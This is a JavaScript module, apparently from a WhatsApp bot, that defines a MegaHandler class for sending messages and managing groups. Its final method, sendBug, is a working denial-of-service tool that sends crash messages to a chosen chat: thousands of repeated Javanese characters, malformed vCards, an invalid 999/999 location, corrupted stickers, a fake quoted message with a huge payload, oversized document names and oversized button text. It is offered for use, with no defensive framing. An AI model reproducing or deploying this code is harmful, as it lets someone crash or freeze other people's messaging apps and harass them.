
---

## 📁 **lib/mega.js**

```javascript
const db = require('./database');

class MegaHandler {
  constructor(sock, store, config) {
    this.sock = sock;
    this.store = store;
    this.config = config;
    this.startTime = Date.now();
  }

  async sendText(jid, text, quoted = null) {
    return await this.sock.sendMessage(jid, { text }, { quoted });
  }

  async reply(m, text) {
    return await this.sendText(m.key.remoteJid, text, m);
  }

  async sendImage(jid, image, caption = '', quoted = null) {
    return await this.sock.sendMessage(jid, { 
      image: Buffer.isBuffer(image) ? image : { url: image }, 
      caption 
    }, { quoted });
  }

  async sendSticker(jid, sticker, quoted = null) {
    return await this.sock.sendMessage(jid, { 
      sticker: Buffer.isBuffer(sticker) ? sticker : { url: sticker }
    }, { quoted });
  }

  async kick(jid, participant) {
    try {
      await this.sock.groupParticipantsUpdate(jid, [participant], 'remove');
      return true;
    } catch { return false; }
  }

  async add(jid, participant) {
    try {
      await this.sock.groupParticipantsUpdate(jid, [participant], 'add');
      return true;
    } catch { return false; }
  }

  async promote(jid, participant) {
    try {
      await this.sock.groupParticipantsUpdate(jid, [participant], 'promote');
      return true;
    } catch { return false; }
  }

  async demote(jid, participant) {
    try {
      await this.sock.groupParticipantsUpdate(jid, [participant], 'demote');
      return true;
    } catch { return false; }
  }

  async muteGroup(jid) {
    try {
      await this.sock.groupSettingUpdate(jid, 'announcement');
      return true;
    } catch { return false; }
  }

  async unmuteGroup(jid) {
    try {
      await this.sock.groupSettingUpdate(jid, 'not_announcement');
      return true;
    } catch { return false; }
  }

  async getGroupMetadata(jid) {
    return await this.sock.groupMetadata(jid);
  }

  async isAdmin(jid, participant) {
    try {
      const meta = await this.getGroupMetadata(jid);
      const admins = meta.participants.filter(p => p.admin);
      return admins.some(p => p.id === participant);
    } catch { return false; }
  }

  async isBotAdmin(jid) {
    const botId = this.sock.user.id.replace(':1', '');
    return await this.isAdmin(jid, botId);
  }

  isOwner(number) {
    const num = number.replace(/\D/g, '');
    return num === this.config.OWNER_NUMBER.replace(/\D/g, '');
  }

  async checkLevel(m, isGroup) {
    const sender = m.key.participant || m.key.remoteJid;
    const isOwner = this.isOwner(sender);
    const isBanned = await db.isBannedUser(sender);
    
    if (isBanned) return { allowed: false, level: 'banned' };
    if (this.config.MODE === 'self' && !isOwner) return { allowed: false, level: 'none' };
    if (this.config.MODE === 'private' && !isOwner) return { allowed: false, level: 'none' };
    
    const level = isOwner ? 'owner' : isGroup ? await this.isAdmin(m.key.remoteJid, sender) ? 'admin' : 'user' : 'user';
    return { allowed: true, level };
  }

  getUptime() {
    const seconds = Math.floor((Date.now() - this.startTime) / 1000);
    const d = Math.floor(seconds / 86400);
    const h = Math.floor((seconds % 86400) / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    
    if (d > 0) return `${d}d ${h}h ${m}m`;
    if (h > 0) return `${h}h ${m}m ${s}s`;
    return `${m}m ${s}s`;
  }

  formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  async downloadMedia(m) {
    const type = Object.keys(m.message)[0];
    const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
    
    if (!mediaTypes.includes(type)) return null;
    
    const stream = await this.sock.downloadContentFromMessage(m.message[type], type.replace('Message', ''));
    let buffer = Buffer.from([]);
    
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    
    return {
      buffer,
      mimetype: m.message[type].mimetype,
      filename: m.message[type].fileName || 'file'
    };
  }

  async sendBug(jid, type = 'text', quoted = null) {
    try {
      switch(type) {
        case 'text':
          const bugText = 'ꦽ'.repeat(5000);
          return await this.sock.sendMessage(jid, { text: bugText }, { quoted });
          
        case 'vcard':
          const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${'ꦽ'.repeat(1000)}\nTEL;type=CELL;waid=0:0\nEND:VCARD`;
          return await this.sock.sendMessage(jid, { 
            contacts: { displayName: 'Bug', contacts: [{ vcard }] }
          }, { quoted });
          
        case 'location':
          return await this.sock.sendMessage(jid, { 
            location: { degreesLatitude: 999, degreesLongitude: 999 }
          }, { quoted });
          
        case 'sticker':
          const corrupted = Buffer.from(' corrupt data '.repeat(100));
          return await this.sock.sendMessage(jid, { sticker: corrupted }, { quoted });
          
        case 'infinite':
          return await this.sock.sendMessage(jid, {
            text: 'Loading...',
            contextInfo: {
              stanzaId: '3EB0FFFFFFFFFFFFFF',
              participant: '0@s.whatsapp.net',
              quotedMessage: { conversation: 'ꦽ'.repeat(10000) }
            }
          }, { quoted });
          
        case 'document':
          return await this.sock.sendMessage(jid, {
            document: Buffer.from('x'.repeat(1000)),
            fileName: `${'ꦽ'.repeat(200)}.pdf`,
            mimetype: 'application/pdf',
            caption: 'ꦽ'.repeat(1000)
          }, { quoted });
          
        case 'button':
          return await this.sock.sendMessage(jid, {
            text: 'Bug',
            templateButtons: [
              { index: 1, urlButton: { displayText: 'ꦽ'.repeat(100), url: 'https://wa.me' } }
            ]
          }, { quoted });
          
        default:
          return await this.reply(quoted || { key: { remoteJid: jid } }, '❌ Unknown bug type');
      }
    } catch (err) {
      console.error('Bug send error:', err);
      return null;
    }
  }
}

module.exports = MegaHandler;

